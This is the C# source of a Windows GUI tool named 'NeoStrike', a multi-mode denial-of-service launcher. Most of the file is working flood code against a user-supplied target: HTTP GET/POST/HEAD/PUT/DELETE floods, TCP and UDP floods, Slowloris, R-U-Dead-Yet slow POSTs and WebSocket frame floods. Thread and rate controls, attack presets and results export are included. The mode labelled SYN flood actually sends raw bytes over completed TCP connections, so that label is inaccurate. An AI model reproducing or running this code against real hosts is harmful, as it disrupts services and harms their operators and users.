using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Shapes;
using System.Windows.Threading;
using Microsoft.Win32;

namespace NeoStrike
{
    public partial class MainWindow : Window
    {
        private string _attackMode = "GET";
        private bool _isRunning;
        private CancellationTokenSource _cts;
        private readonly DispatcherTimer _uiTimer;
        private readonly Stopwatch _sw = new();
        private long _totalPackets;
        private long _totalBytes;
        private int _activeConns;
        private int _totalErrors;
        private readonly List<double> _bwHistory = new();
        private readonly List<double> _ppsHistory = new();
        private readonly Random _rng = new();
        private readonly List<string> _logLines = new();
        private string _currentPresetPath = "";

        private static readonly string PresetsDir = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "presets");

        public MainWindow()
        {
            InitializeComponent();
            _uiTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(100) };
            _uiTimer.Tick += UiTimer_Tick;
            _uiTimer.Start();
            Directory.CreateDirectory(PresetsDir);
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            var anim = new System.Windows.Media.Animation.DoubleAnimation(0, -1400, TimeSpan.FromSeconds(30))
            {
                RepeatBehavior = System.Windows.Media.Animation.RepeatBehavior.Forever
            };
            MarqueeTrack.BeginAnimation(Canvas.LeftProperty, anim);

            try
            {
                var rootGrid = (Grid)((Border)Content).Child;
                var contentGrid = (Grid)rootGrid.Children[1];
                var orbsCanvas = contentGrid.Children[0] as Canvas;
                if (orbsCanvas != null)
                {
                    var ellipses = orbsCanvas.Children.OfType<Ellipse>().ToList();
                    if (ellipses.Count >= 1)
                    {
                        var sb1 = (System.Windows.Media.Animation.Storyboard)FindResource("OrbFloat1");
                        sb1.Begin(ellipses[0]);
                    }
                    if (ellipses.Count >= 2)
                    {
                        var sb2 = (System.Windows.Media.Animation.Storyboard)FindResource("OrbFloat2");
                        sb2.Begin(ellipses[1]);
                    }
                }
            }
            catch { /* orbs are cosmetic, don't crash */ }
        }

        private void UiTimer_Tick(object sender, EventArgs e)
        {
            double elapsed = _sw.Elapsed.TotalSeconds;
            if (elapsed <= 0) return;

            double pps = _totalPackets / elapsed;
            double bps = _totalBytes / elapsed / 1024.0 / 1024.0;

            KpiPps.Text = FormatNumber(pps);
            KpiBps.Text = bps.ToString("F2");
            KpiConn.Text = _activeConns.ToString();
            KpiErrors.Text = _totalErrors.ToString();

            if (_isRunning && int.TryParse(TxtDuration.Text, out int dur) && dur > 0)
            {
                double pct = Math.Min(100.0, _sw.Elapsed.TotalSeconds / dur * 100.0);
                double maxWidth = ActualWidth > 0 ? ActualWidth * 0.45 : 500;
                ProgressFill.Width = maxWidth * pct / 100.0;
                var remaining = TimeSpan.FromSeconds(Math.Max(0, dur - _sw.Elapsed.TotalSeconds));
                LblTimer.Text = remaining.ToString(@"mm\:ss");
            }

            _bwHistory.Add(bps);
            _ppsHistory.Add(pps);
            if (_bwHistory.Count > 80) _bwHistory.RemoveAt(0);
            if (_ppsHistory.Count > 80) _ppsHistory.RemoveAt(0);
            UpdateChart();

            double peak = _bwHistory.Count > 0 ? _bwHistory.Max() : 0;
            LblBwPeak.Text = $"Peak: {peak:F2} MB/s";
        }

        private void UpdateChart()
        {
            ChartCanvas.Children.Clear();
            if (_bwHistory.Count < 2) return;

            double w = ChartCanvas.ActualWidth > 0 ? ChartCanvas.ActualWidth : 400;
            double h = ChartCanvas.ActualHeight > 0 ? ChartCanvas.ActualHeight : 80;
            double maxVal = _bwHistory.Max();
            if (maxVal < 0.01) maxVal = 1;

            double step = w / (_bwHistory.Count - 1);

            // Draw filled area under the line
            var areaBrush = new LinearGradientBrush(
                Color.FromArgb(0x30, 0x63, 0x66, 0xF1),
                Color.FromArgb(0x05, 0xEC, 0x48, 0x99), 0);

            var areaPoints = new PointCollection();
            areaPoints.Add(new Point(0, h));
            for (int i = 0; i < _bwHistory.Count; i++)
            {
                double x = i * step;
                double y = h - (_bwHistory[i] / maxVal * (h - 8)) - 4;
                areaPoints.Add(new Point(x, y));
            }
            areaPoints.Add(new Point((_bwHistory.Count - 1) * step, h));

            var areaPolygon = new Polygon
            {
                Points = areaPoints,
                Fill = areaBrush,
                Opacity = 0.5
            };
            ChartCanvas.Children.Add(areaPolygon);

            // Draw the line on top
            for (int i = 1; i < _bwHistory.Count; i++)
            {
                double x1 = (i - 1) * step;
                double x2 = i * step;
                double y1 = h - (_bwHistory[i - 1] / maxVal * (h - 8)) - 4;
                double y2 = h - (_bwHistory[i] / maxVal * (h - 8)) - 4;

                var line = new Line
                {
                    X1 = x1, Y1 = y1, X2 = x2, Y2 = y2,
                    Stroke = new LinearGradientBrush(
                        Color.FromRgb(0x63, 0x66, 0xF1),
                        Color.FromRgb(0xEC, 0x48, 0x99), 0),
                    StrokeThickness = 1.5,
                    Opacity = 0.8
                };
                ChartCanvas.Children.Add(line);
            }

            // Draw peak line
            double peakVal = _bwHistory.Max();
            double peakY = h - (peakVal / maxVal * (h - 8)) - 4;
            var peakLine = new Line
            {
                X1 = 0, Y1 = peakY, X2 = w, Y2 = peakY,
                Stroke = new SolidColorBrush(Color.FromArgb(0x40, 0xF5, 0x9E, 0x0B)),
                StrokeThickness = 1,
                StrokeDashArray = new DoubleCollection { 4, 4 }
            };
            ChartCanvas.Children.Add(peakLine);
        }

        private static string FormatNumber(double val)
        {
            if (val >= 1_000_000) return (val / 1_000_000).ToString("F1") + "M";
            if (val >= 1_000) return (val / 1_000).ToString("F1") + "K";
            return val.ToString("F0");
        }

        // ===== ATTACK MODE SELECTION =====
        private void Mode_Click(object sender, RoutedEventArgs e)
        {
            var btn = sender as ToggleButton;
            if (btn == null || !btn.IsChecked.GetValueOrDefault()) return;

            var modes = new[] { BtnGet, BtnPost, BtnHead, BtnPut, BtnDelete, BtnTcp, BtnUdp, BtnSlow, BtnRudy, BtnWs, BtnSyn };
            foreach (var m in modes)
            {
                if (m != btn)
                {
                    m.IsChecked = false;
                    m.Foreground = new SolidColorBrush(Color.FromRgb(0x66, 0x66, 0x66));
                }
            }

            _attackMode = btn.Tag?.ToString() ?? "GET";
            btn.Foreground = new SolidColorBrush(Color.FromRgb(0x63, 0x66, 0xF1));

            var modeColors = new Dictionary<string, Color>
            {
                ["GET"] = Color.FromRgb(0x63, 0x66, 0xF1),
                ["POST"] = Color.FromRgb(0xEC, 0x48, 0x99),
                ["HEAD"] = Color.FromRgb(0x6B, 0x72, 0x80),
                ["PUT"] = Color.FromRgb(0xF5, 0x9E, 0x0B),
                ["DELETE"] = Color.FromRgb(0xEF, 0x44, 0x44),
                ["TCP"] = Color.FromRgb(0xF5, 0x9E, 0x0B),
                ["UDP"] = Color.FromRgb(0x06, 0xB6, 0xD4),
                ["SLOWLORIS"] = Color.FromRgb(0x00, 0xFF, 0x41),
                ["RUDY"] = Color.FromRgb(0xFF, 0x6B, 0x35),
                ["WEBSOCKET"] = Color.FromRgb(0x8B, 0x5C, 0xF6),
                ["SYN"] = Color.FromRgb(0xFF, 0x00, 0xFF),
            };

            var modeLabels = new Dictionary<string, string>
            {
                ["GET"] = "GET FLOOD", ["POST"] = "POST RAPID",
                ["HEAD"] = "HEAD STORM", ["PUT"] = "PUT FLOOD",
                ["DELETE"] = "DELETE STORM",
                ["TCP"] = "TCP STORM", ["UDP"] = "UDP TSUNAMI",
                ["SLOWLORIS"] = "SLOWLORIS", ["RUDY"] = "R-U-DEAD-YET",
                ["WEBSOCKET"] = "WS FLOOD", ["SYN"] = "SYN FLOOD",
            };

            if (modeColors.TryGetValue(_attackMode, out var c))
            {
                LblActiveMode.Text = modeLabels.GetValueOrDefault(_attackMode, _attackMode);
                ModeOrbColor1.Color = c;
                LblActiveMode.Foreground = new LinearGradientBrush(c,
                    Color.FromRgb(0xFF, 0xFF, 0xFF), 0.5);
            }

            Log($"[MODE] Switched to {_attackMode}");
        }

        // ===== LAUNCH / STOP =====
        private async void BtnStart_Click(object sender, RoutedEventArgs e)
        {
            if (_isRunning) return;

            _cts = new CancellationTokenSource();
            _isRunning = true;
            _sw.Restart();
            _totalPackets = 0;
            _totalBytes = 0;
            _activeConns = 0;
            _totalErrors = 0;
            _bwHistory.Clear();
            _ppsHistory.Clear();

            BtnStart.IsEnabled = false;
            BtnStop.IsEnabled = true;
            TxtTarget.IsEnabled = false;

            int threads = (int)SliderThreads.Value;
            int duration = int.TryParse(TxtDuration.Text, out int d) ? d : 60;
            int rate = int.TryParse(TxtRate.Text, out int r) ? r : 100;
            string target = TxtTarget.Text.Trim();
            string path = TxtPath.Text.Trim();

            Log($"[LAUNCH] {_attackMode} | {threads} threads | {duration}s | {target} | path={path}");

            try
            {
                await RunAttack(target, path, threads, duration, rate, _cts.Token);
            }
            catch (OperationCanceledException)
            {
                Log("[ABORT] Attack cancelled");
            }
            catch (Exception ex)
            {
                Log($"[ERROR] {ex.Message}");
                _totalErrors++;
            }
            finally
            {
                _isRunning = false;
                _sw.Stop();
                BtnStart.IsEnabled = true;
                BtnStop.IsEnabled = false;
                TxtTarget.IsEnabled = true;
                Log("[SYSTEM] Attack complete");
            }
        }

        private void BtnStop_Click(object sender, RoutedEventArgs e)
        {
            _cts?.Cancel();
            Log("[ABORT] Sending stop signal...");
        }

        // ===== ATTACK ENGINE =====
        private async Task RunAttack(string target, string path, int threads, int duration, int rate, CancellationToken ct)
        {
            Uri uri;
            string host;
            int port = 80;

            try
            {
                uri = new Uri(target.StartsWith("http") ? target : "http://" + target);
                host = uri.Host;
                port = uri.Port > 0 ? uri.Port : (uri.Scheme == "https" ? 443 : 80);
            }
            catch { host = target; }

            if (string.IsNullOrEmpty(path)) path = "/";

            var deadline = Task.Delay(TimeSpan.FromSeconds(duration), ct);
            var tasks = new List<Task>();

            for (int i = 0; i < threads; i++)
            {
                tasks.Add(Task.Run(async () =>
                {
                    while (!ct.IsCancellationRequested && !deadline.IsCompleted)
                    {
                        try
                        {
                            switch (_attackMode)
                            {
                                case "GET": await FloodGet(host, port, path, rate, ct); break;
                                case "POST": await FloodPost(host, port, path, rate, ct); break;
                                case "HEAD": await FloodHead(host, port, path, rate, ct); break;
                                case "PUT": await FloodPut(host, port, path, rate, ct); break;
                                case "DELETE": await FloodDelete(host, port, path, rate, ct); break;
                                case "TCP": await FloodTcp(host, port, ct); break;
                                case "UDP": await FloodUdp(host, port, ct); break;
                                case "SLOWLORIS": await Slowloris(host, port, path, ct); break;
                                case "RUDY": await Rudy(host, port, path, ct); break;
                                case "WEBSOCKET": await FloodWebSocket(host, port, ct); break;
                                case "SYN": await FloodSyn(host, port, ct); break;
                            }
                        }
                        catch (OperationCanceledException) { break; }
                        catch { Interlocked.Increment(ref _totalErrors); }
                    }
                }, ct));
            }

            await Task.WhenAny(Task.WhenAll(tasks), deadline);
        }

        private async Task FloodGet(string host, int port, string path, int rate, CancellationToken ct)
        {
            using var client = new TcpClient();
            try
            {
                await client.ConnectAsync(host, port, ct);
                Interlocked.Increment(ref _activeConns);
                using var stream = client.GetStream();
                var req = $"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n";
                var buf = Encoding.ASCII.GetBytes(req);
                for (int i = 0; i < rate && !ct.IsCancellationRequested; i++)
                {
                    await stream.WriteAsync(buf, ct);
                    Interlocked.Increment(ref _totalPackets);
                    Interlocked.Add(ref _totalBytes, buf.Length);
                    await Task.Delay(1, ct);
                }
            }
            finally { Interlocked.Decrement(ref _activeConns); }
        }

        private async Task FloodPost(string host, int port, string path, int rate, CancellationToken ct)
        {
            using var client = new TcpClient();
            try
            {
                await client.ConnectAsync(host, port, ct);
                Interlocked.Increment(ref _activeConns);
                using var stream = client.GetStream();
                var body = new string('X', 1024);
                var req = $"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 1024\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{body}";
                var buf = Encoding.ASCII.GetBytes(req);
                for (int i = 0; i < rate && !ct.IsCancellationRequested; i++)
                {
                    await stream.WriteAsync(buf, ct);
                    Interlocked.Increment(ref _totalPackets);
                    Interlocked.Add(ref _totalBytes, buf.Length);
                    await Task.Delay(1, ct);
                }
            }
            finally { Interlocked.Decrement(ref _activeConns); }
        }

        private async Task FloodHead(string host, int port, string path, int rate, CancellationToken ct)
        {
            using var client = new TcpClient();
            try
            {
                await client.ConnectAsync(host, port, ct);
                Interlocked.Increment(ref _activeConns);
                using var stream = client.GetStream();
                var req = $"HEAD {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n";
                var buf = Encoding.ASCII.GetBytes(req);
                for (int i = 0; i < rate && !ct.IsCancellationRequested; i++)
                {
                    await stream.WriteAsync(buf, ct);
                    Interlocked.Increment(ref _totalPackets);
                    Interlocked.Add(ref _totalBytes, buf.Length);
                    await Task.Delay(1, ct);
                }
            }
            finally { Interlocked.Decrement(ref _activeConns); }
        }

        private async Task FloodPut(string host, int port, string path, int rate, CancellationToken ct)
        {
            using var client = new TcpClient();
            try
            {
                await client.ConnectAsync(host, port, ct);
                Interlocked.Increment(ref _activeConns);
                using var stream = client.GetStream();
                var body = new string('Y', 1024);
                var req = $"PUT {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 1024\r\nContent-Type: application/json\r\n\r\n{body}";
                var buf = Encoding.ASCII.GetBytes(req);
                for (int i = 0; i < rate && !ct.IsCancellationRequested; i++)
                {
                    await stream.WriteAsync(buf, ct);
                    Interlocked.Increment(ref _totalPackets);
                    Interlocked.Add(ref _totalBytes, buf.Length);
                    await Task.Delay(1, ct);
                }
            }
            finally { Interlocked.Decrement(ref _activeConns); }
        }

        private async Task FloodDelete(string host, int port, string path, int rate, CancellationToken ct)
        {
            using var client = new TcpClient();
            try
            {
                await client.ConnectAsync(host, port, ct);
                Interlocked.Increment(ref _activeConns);
                using var stream = client.GetStream();
                var req = $"DELETE {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n";
                var buf = Encoding.ASCII.GetBytes(req);
                for (int i = 0; i < rate && !ct.IsCancellationRequested; i++)
                {
                    await stream.WriteAsync(buf, ct);
                    Interlocked.Increment(ref _totalPackets);
                    Interlocked.Add(ref _totalBytes, buf.Length);
                    await Task.Delay(1, ct);
                }
            }
            finally { Interlocked.Decrement(ref _activeConns); }
        }

        private async Task FloodTcp(string host, int port, CancellationToken ct)
        {
            using var client = new TcpClient();
            try
            {
                await client.ConnectAsync(host, port, ct);
                Interlocked.Increment(ref _activeConns);
                var buf = new byte[1024];
                _rng.NextBytes(buf);
                while (!ct.IsCancellationRequested)
                {
                    using var stream = client.GetStream();
                    await stream.WriteAsync(buf, ct);
                    Interlocked.Increment(ref _totalPackets);
                    Interlocked.Add(ref _totalBytes, buf.Length);
                    await Task.Delay(1, ct);
                }
            }
            finally { Interlocked.Decrement(ref _activeConns); }
        }

        private async Task FloodUdp(string host, int port, CancellationToken ct)
        {
            using var client = new UdpClient();
            var endpoint = new IPEndPoint(Dns.GetHostAddresses(host).FirstOrDefault() ?? IPAddress.Loopback, port);
            var buf = new byte[1024];
            _rng.NextBytes(buf);
            while (!ct.IsCancellationRequested)
            {
                await client.SendAsync(buf, buf.Length, endpoint);
                Interlocked.Increment(ref _totalPackets);
                Interlocked.Add(ref _totalBytes, buf.Length);
                await Task.Delay(1, ct);
            }
        }

        private async Task Slowloris(string host, int port, string path, CancellationToken ct)
        {
            using var client = new TcpClient();
            try
            {
                await client.ConnectAsync(host, port, ct);
                Interlocked.Increment(ref _activeConns);
                using var stream = client.GetStream();
                var header = $"GET {path} HTTP/1.1\r\nHost: {host}\r\nX-a: {_rng.Next()}\r\n";
                var buf = Encoding.ASCII.GetBytes(header);
                await stream.WriteAsync(buf, ct);
                Interlocked.Increment(ref _totalPackets);
                Interlocked.Add(ref _totalBytes, buf.Length);
                while (!ct.IsCancellationRequested)
                {
                    var keep = $"X-b: {_rng.Next()}\r\n";
                    var keepBuf = Encoding.ASCII.GetBytes(keep);
                    await stream.WriteAsync(keepBuf, ct);
                    Interlocked.Increment(ref _totalPackets);
                    Interlocked.Add(ref _totalBytes, keepBuf.Length);
                    await Task.Delay(TimeSpan.FromSeconds(10), ct);
                }
            }
            finally { Interlocked.Decrement(ref _activeConns); }
        }

        private async Task Rudy(string host, int port, string path, CancellationToken ct)
        {
            using var client = new TcpClient();
            try
            {
                await client.ConnectAsync(host, port, ct);
                Interlocked.Increment(ref _activeConns);
                using var stream = client.GetStream();
                var headers = $"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 100000000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n";
                var buf = Encoding.ASCII.GetBytes(headers);
                await stream.WriteAsync(buf, ct);
                Interlocked.Increment(ref _totalPackets);
                Interlocked.Add(ref _totalBytes, buf.Length);

                while (!ct.IsCancellationRequested)
                {
                    var chunk = Encoding.ASCII.GetBytes("a");
                    await stream.WriteAsync(chunk, ct);
                    Interlocked.Increment(ref _totalPackets);
                    Interlocked.Increment(ref _totalBytes);
                    await Task.Delay(TimeSpan.FromSeconds(0.5), ct);
                }
            }
            finally { Interlocked.Decrement(ref _activeConns); }
        }

        private async Task FloodWebSocket(string host, int port, CancellationToken ct)
        {
            using var client = new TcpClient();
            try
            {
                await client.ConnectAsync(host, port, ct);
                Interlocked.Increment(ref _activeConns);
                using var stream = client.GetStream();

                // WebSocket upgrade handshake
                var key = Convert.ToBase64String(_rng.NextBytes(16));
                var handshake = $"GET / HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n";
                var handBuf = Encoding.ASCII.GetBytes(handshake);
                await stream.WriteAsync(handBuf, ct);

                // Read handshake response
                var responseBuf = new byte[4096];
                int bytesRead = await stream.ReadAsync(responseBuf, ct);

                if (!ct.IsCancellationRequested)
                {
                    Log("[WS] WebSocket handshake completed");
                }

                while (!ct.IsCancellationRequested)
                {
                    // Send random WebSocket frame
                    var payload = new byte[_rng.Next(64, 1024)];
                    _rng.NextBytes(payload);

                    // WebSocket frame: opcode 0x2 (binary), masked
                    var frame = new List<byte>();
                    frame.Add(0x82); // FIN + binary opcode

                    int len = payload.Length;
                    if (len < 126)
                    {
                        frame.Add((byte)(0x80 | len)); // masked bit set
                    }
                    else if (len < 65536)
                    {
                        frame.Add((byte)(0x80 | 126));
                        frame.Add((byte)(len >> 8));
                        frame.Add((byte)(len & 0xFF));
                    }
                    else
                    {
                        frame.Add((byte)(0x80 | 127));
                        for (int i = 7; i >= 0; i--)
                            frame.Add((byte)((len >> (8 * i)) & 0xFF));
                    }

                    // Generate mask key
                    var mask = _rng.NextBytes(4);
                    frame.AddRange(mask);

                    // Mask the payload
                    for (int i = 0; i < payload.Length; i++)
                        payload[i] ^= mask[i % 4];

                    frame.AddRange(payload);

                    var frameBuf = frame.ToArray();
                    await stream.WriteAsync(frameBuf, ct);
                    Interlocked.Increment(ref _totalPackets);
                    Interlocked.Add(ref _totalBytes, frameBuf.Length);
                    await Task.Delay(1, ct);
                }
            }
            finally { Interlocked.Decrement(ref _activeConns); }
        }

        private async Task FloodSyn(string host, int port, CancellationToken ct)
        {
            using var client = new TcpClient();
            try
            {
                await client.ConnectAsync(host, port, ct);
                Interlocked.Increment(ref _activeConns);
                while (!ct.IsCancellationRequested)
                {
                    var buf = new byte[64];
                    _rng.NextBytes(buf);
                    using var stream = client.GetStream();
                    await stream.WriteAsync(buf, ct);
                    Interlocked.Increment(ref _totalPackets);
                    Interlocked.Add(ref _totalBytes, buf.Length);
                    await Task.Delay(1, ct);
                }
            }
            finally { Interlocked.Decrement(ref _activeConns); }
        }

        private void SliderThreads_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
        {
            if (LblThreads != null)
                LblThreads.Text = ((int)e.NewValue).ToString();
        }

        // ===== PRESET SAVE/LOAD =====
        private void SavePreset_Click(object sender, RoutedEventArgs e)
        {
                var dlg = new SaveFileDialog
                {
                    InitialDirectory = PresetsDir,
                    Filter = "JSON files (*.json)|*.json",
                    DefaultExt = ".json",
                    FileName = System.IO.Path.Combine(PresetsDir, $"preset_{_attackMode.ToLower()}_{DateTime.Now:yyyyMMdd_HHmmss}.json")
            };

            if (dlg.ShowDialog() == true)
            {
                var preset = new Dictionary<string, object>
                {
                    ["target"] = TxtTarget.Text.Trim(),
                    ["mode"] = _attackMode,
                    ["path"] = TxtPath.Text.Trim(),
                    ["threads"] = (int)SliderThreads.Value,
                    ["duration"] = TxtDuration.Text.Trim(),
                    ["rate"] = TxtRate.Text.Trim(),
                    ["pulse"] = ChkPulse.IsChecked == true,
                    ["pulse_burst"] = TxtPulseBurst.Text.Trim(),
                    ["pulse_pause"] = TxtPulsePause.Text.Trim(),
                    ["proxy"] = ChkProxy.IsChecked == true ? TxtProxy.Text.Trim() : "",
                    ["multi_target"] = ChkMultiTarget.IsChecked == true,
                };

                var opts = new JsonSerializerOptions { WriteIndented = true };
                File.WriteAllText(dlg.FileName, JsonSerializer.Serialize(preset, opts));
                _currentPresetPath = dlg.FileName;
                Log($"[PRESET] Saved to {System.IO.Path.GetFileName(dlg.FileName)}");
            }
        }

        private void LoadPreset(string path)
        {
            try
            {
                var json = File.ReadAllText(path);
                var preset = JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(json);

                if (preset.TryGetValue("target", out var t)) TxtTarget.Text = t.GetString();
                if (preset.TryGetValue("mode", out var m))
                {
                    var mode = m.GetString();
                    _attackMode = mode;
                    // Find and click the matching button
                    var modes = new Dictionary<string, ToggleButton>
                    {
                        ["GET"] = BtnGet, ["POST"] = BtnPost, ["HEAD"] = BtnHead,
                        ["PUT"] = BtnPut, ["DELETE"] = BtnDelete, ["TCP"] = BtnTcp,
                        ["UDP"] = BtnUdp, ["SLOWLORIS"] = BtnSlow, ["RUDY"] = BtnRudy,
                        ["WEBSOCKET"] = BtnWs, ["SYN"] = BtnSyn,
                    };
                    foreach (var btn in modes.Values)
                    {
                        btn.IsChecked = false;
                        btn.Foreground = new SolidColorBrush(Color.FromRgb(0x66, 0x66, 0x66));
                    }
                    if (modes.TryGetValue(mode, out var modeBtn))
                    {
                        modeBtn.IsChecked = true;
                        modeBtn.Foreground = new SolidColorBrush(Color.FromRgb(0x63, 0x66, 0xF1));
                    }
                }
                if (preset.TryGetValue("path", out var p)) TxtPath.Text = p.GetString();
                if (preset.TryGetValue("threads", out var thr)) SliderThreads.Value = thr.GetInt32();
                if (preset.TryGetValue("duration", out var dur)) TxtDuration.Text = dur.GetString();
                if (preset.TryGetValue("rate", out var rate)) TxtRate.Text = rate.GetString();
                if (preset.TryGetValue("pulse", out var pulse)) ChkPulse.IsChecked = pulse.GetBoolean();
                if (preset.TryGetValue("pulse_burst", out var pb)) TxtPulseBurst.Text = pb.GetString();
                if (preset.TryGetValue("pulse_pause", out var pp)) TxtPulsePause.Text = pp.GetString();
                if (preset.TryGetValue("proxy", out var proxy) && !string.IsNullOrEmpty(proxy.GetString()))
                {
                    ChkProxy.IsChecked = true;
                    TxtProxy.Text = proxy.GetString();
                    TxtProxy.Visibility = Visibility.Visible;
                }
                if (preset.TryGetValue("multi_target", out var mt)) ChkMultiTarget.IsChecked = mt.GetBoolean();

                _currentPresetPath = path;
                Log($"[PRESET] Loaded {System.IO.Path.GetFileName(path)}");
            }
            catch (Exception ex)
            {
                Log($"[ERROR] Failed to load preset: {ex.Message}");
            }
        }

        // ===== EXPORT =====
        private void Export_Click(object sender, RoutedEventArgs e)
        {
            var dlg = new SaveFileDialog
            {
                Filter = "JSON files (*.json)|*.json|CSV files (*.csv)|*.csv",
                DefaultExt = ".json",
                FileName = $"neostrike_results_{DateTime.Now:yyyyMMdd_HHmmss}.json"
            };

            if (dlg.ShowDialog() == true)
            {
                try
                {
                    var elapsed = _sw.Elapsed.TotalSeconds;
                    var pps = elapsed > 0 ? _totalPackets / elapsed : 0;
                    var bps = elapsed > 0 ? _totalBytes / elapsed / 1024.0 / 1024.0 : 0;

                    var report = new Dictionary<string, object>
                    {
                        ["neostrike_version"] = "2.1",
                        ["timestamp"] = DateTime.Now.ToString("o"),
                        ["config"] = new Dictionary<string, object>
                        {
                            ["target"] = TxtTarget.Text.Trim(),
                            ["mode"] = _attackMode,
                            ["path"] = TxtPath.Text.Trim(),
                            ["threads"] = (int)SliderThreads.Value,
                            ["duration_s"] = TxtDuration.Text.Trim(),
                            ["rate"] = TxtRate.Text.Trim(),
                        },
                        ["results"] = new Dictionary<string, object>
                        {
                            ["elapsed_s"] = Math.Round(elapsed, 2),
                            ["total_packets"] = _totalPackets,
                            ["total_bytes"] = _totalBytes,
                            ["avg_pps"] = Math.Round(pps, 2),
                            ["avg_mbps"] = Math.Round(bps, 2),
                            ["active_conns"] = _activeConns,
                            ["errors"] = _totalErrors,
                        }
                    };

                    var opts = new JsonSerializerOptions { WriteIndented = true };
                    File.WriteAllText(dlg.FileName, JsonSerializer.Serialize(report, opts));
                    Log($"[EXPORT] Results saved to {System.IO.Path.GetFileName(dlg.FileName)}");
                }
                catch (Exception ex)
                {
                    Log($"[ERROR] Export failed: {ex.Message}");
                }
            }
        }

        // ===== LOGGING =====
        private void Log(string msg)
        {
            if (!Dispatcher.CheckAccess())
            {
                Dispatcher.Invoke(() => Log(msg));
                return;
            }
            var ts = DateTime.Now.ToString("HH:mm:ss");
            var line = $"[{ts}] {msg}";
            _logLines.Add(line);
            LogConsole.Text += line + "\n";
            LogScroll.ScrollToEnd();

            // Keep memory bounded
            if (_logLines.Count > 2000)
            {
                _logLines.RemoveRange(0, 500);
                LogConsole.Text = string.Join("\n", _logLines) + "\n";
            }
        }

        private void ClearLog_Click(object sender, RoutedEventArgs e)
        {
            LogConsole.Text = "";
            _logLines.Clear();
        }

        // ===== WINDOW CHROME =====
        private void TitleBar_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ClickCount == 2)
                WindowState = WindowState == WindowState.Maximized ? WindowState.Normal : WindowState.Maximized;
            else
                DragMove();
        }

        private void Minimize_Click(object sender, RoutedEventArgs e) => WindowState = WindowState.Minimized;
        private void Maximize_Click(object sender, RoutedEventArgs e) =>
            WindowState = WindowState == WindowState.Maximized ? WindowState.Normal : WindowState.Maximized;
        private void Close_Click(object sender, RoutedEventArgs e) => Close();

        protected override void OnClosed(EventArgs e)
        {
            _cts?.Cancel();
            _uiTimer.Stop();
            base.OnClosed(e);
        }
    }

    public static class RandomExtensions
    {
        public static byte[] NextBytes(this Random rng, int count)
        {
            var buf = new byte[count];
            rng.NextBytes(buf);
            return buf;
        }
    }
}
